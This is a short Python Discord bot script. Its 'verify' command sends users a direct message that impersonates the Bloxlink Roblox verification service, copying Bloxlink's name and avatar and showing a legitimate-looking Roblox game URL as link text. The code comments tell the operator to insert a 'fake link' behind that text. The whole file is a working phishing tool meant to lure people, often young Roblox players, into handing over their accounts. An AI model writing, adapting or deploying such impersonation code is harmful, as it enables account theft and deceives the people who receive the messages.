import discord
import datetime
from discord.ext import commands
import asyncio
TOKEN = 'YOUR BOT TOKEN HERE' #INSTERT YOUR BOT TOKEN THERE
beige = discord.Color.from_rgb(256, 100, 100)


client= commands.Bot(command_prefix='!')


@client.event
async def on_ready():
    print ('Ready')

@client.command()
async def verify(ctx):
    author = ctx.message.author
    
    test_e = discord.Embed(
        colour=discord.Colour(0xff6464)
    )
    draw = discord.Embed(
        colour=discord.Colour(0xff6464)
    )
    test_e.set_author(name="You must be new!")
    test_e.add_field(name="Please verify your account with Bloxlink by joining this game!", value="[https://www.roblox.com/games/3918221347/Bloxlink-Verification-Game?privateServerLinkCode=537609936925](INSERT YOUR FAKE LINK HERE)", inline=False) #INSERT YOUR FAKE LINK AT THE () PART
    test_e.set_footer(icon_url="https://cdn.discordapp.com/avatars/865378528887308318/78776d34d943cc8c1501ae365f017c1c.png?size=128", text = "Bloxlink")
    test_e.set_image(url = "https://images-ext-2.discordapp.net/external/KHgnlQrg5kVthDcnpe1wcYzkYplbF_e1WQwlQS58XbY/https/t2.rbxcdn.com/73def03f458ec62be70418f8e9a35da5?width=400&height=225")
    test_e.timestamp = datetime.datetime.utcnow()
    draw.add_field(name="Verification", value=f'I have sent you a link to verify in your direct messages {ctx.author.mention}', inline=False)
   

    await author.send(embed=test_e)
    await ctx.send(embed=draw)   




client.run(TOKEN)
